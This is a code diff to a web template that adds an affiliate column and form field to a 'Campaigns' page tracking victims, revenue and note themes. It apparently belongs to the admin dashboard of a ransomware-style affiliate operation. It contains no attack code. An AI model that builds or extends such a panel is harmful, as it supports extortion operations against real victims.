@@ -4,17 +4,18 @@
 <h1>Campaigns</h1>
 <div class="panel">
 <table>
-  <tr><th>id</th><th>name</th><th>victims</th><th>revenue</th><th>active</th><th>created</th></tr>
+  <tr><th>id</th><th>name</th><th>affiliate</th><th>victims</th><th>revenue</th><th>active</th><th>created</th></tr>
   {% for c in rows %}
   <tr>
     <td>{{ c['id'] }}</td>
     <td><a href="{{ url_for('campaign_page', cid=c['id']) }}">{{ c['name'] }}</a></td>
+    <td>{{ c['affiliate'] or '—' }}</td>
     <td>{{ c['victims'] }}</td>
     <td>${{ '%.2f'|format(c['revenue'] or 0) }}</td>
     <td>{{ 'yes' if c['active'] else 'no' }}</td>
     <td class="small">{{ c['created'] or '' }}</td>
   </tr>
-  {% else %}<tr><td colspan="6" class="sub">no campaigns</td></tr>{% endfor %}
+  {% else %}<tr><td colspan="7" class="sub">no campaigns</td></tr>{% endfor %}
 </table>
 </div>
 <div class="panel">
@@ -23,6 +24,7 @@
     <input type="hidden" name="csrf" value="{{ csrf_token }}">
     <input name="name" placeholder="campaign name" required>
     <input name="note" placeholder="note">
+    <input name="affiliate" placeholder="affiliate username (optional)">
     <textarea name="config" rows="4" placeholder='{"note_theme": "invoice"}'></textarea>
     <div style="height:8px"></div>
     <button class="btn blue" type="submit">CREATE</button>
